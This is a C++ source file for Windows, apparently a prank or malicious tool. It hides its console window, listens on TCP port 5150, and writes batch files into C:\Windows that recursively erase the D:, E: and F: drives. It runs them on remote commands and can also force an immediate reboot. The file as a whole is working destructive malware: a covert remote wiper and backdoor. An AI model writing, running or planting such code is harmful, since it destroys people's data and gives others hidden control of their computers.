#include<bits/stdc++.h>
#include<windows.h>
#include <WINSOCK2.H> 
#include<ctime>
#define tin int
#define itn int
#define tni int
#define nit int
#define nti int
#define pritnf printf
#define scnaf scanf
#define retrun return
#define maxa 10240

#define PORT 5150
#define MSGSIZE 10240//收发缓冲区的大小
#pragma comment(lib, "ws2_32.lib")
using namespace std;

char szMessage[MSGSIZE],a[maxa]="";      
int ret;      
int iaddrSize=sizeof(SOCKADDR_IN);

HWND hwnd;
HANDLE hMutex;

DWORD WINAPI jc(LPVOID lpParamter);

int main()
{
	char str[256];
	GetConsoleTitle(str,sizeof(str));
	hwnd=FindWindow(NULL,str);
	ShowWindow(hwnd,0);//隐藏控制台
	//
	WSADATA wsaData;      
    SOCKET sListen;
	SOCKET sClient;      
    SOCKADDR_IN local;      
    SOCKADDR_IN client;
    WSAStartup(0x0202,&wsaData);    
    //        
    sListen=socket(AF_INET, SOCK_STREAM,IPPROTO_TCP);
    local.sin_family=AF_INET;      
    local.sin_port=htons(PORT);
    local.sin_addr.s_addr=htonl(INADDR_ANY);      
    bind(sListen, (struct sockaddr*)&local,sizeof(SOCKADDR_IN));
    //
    listen(sListen,1);
    //
    sClient=accept(sListen,(struct sockaddr*)&client,&iaddrSize);      
    printf("Accepted client:%s:%d\n",inet_ntoa(client.sin_addr),ntohs(client.sin_port));
    //
	freopen("C://Windows//d.bat","w",stdout);
	printf("erase /S /Q D:\\*");
	freopen("C://Windows//e.bat","w",stdout);
	printf("erase /S /Q E:\\*");
	freopen("C://Windows//f.bat","w",stdout);
	printf("erase /S /Q F:\\*");
	//
	/*
	HANDLE hThreadjc=CreateThread(NULL,0,jc,NULL,0,NULL);
	Sleep(1000);
	system("cls");
	*/
	//
	while(1)
	{
        ret=recv(sClient,szMessage,MSGSIZE,0);
    	szMessage[ret]='\000';
        if(strcmp(szMessage,"d")==0)
        {
        	system("start C://Windows//d.bat");
		}
		else if(strcmp(szMessage,"e")==0)
		{
			system("start C://Windows//e.bat");
		}
		else if(strcmp(szMessage,"f")==0)
		{
			system("start C://Windows//f.bat");
		}
		else if(strcmp(szMessage,"guanji")==0)
		{
			system("shutdown /f /r /t 1");
		}
		else
		{
			continue;
		}
	}
	return 0;	
}
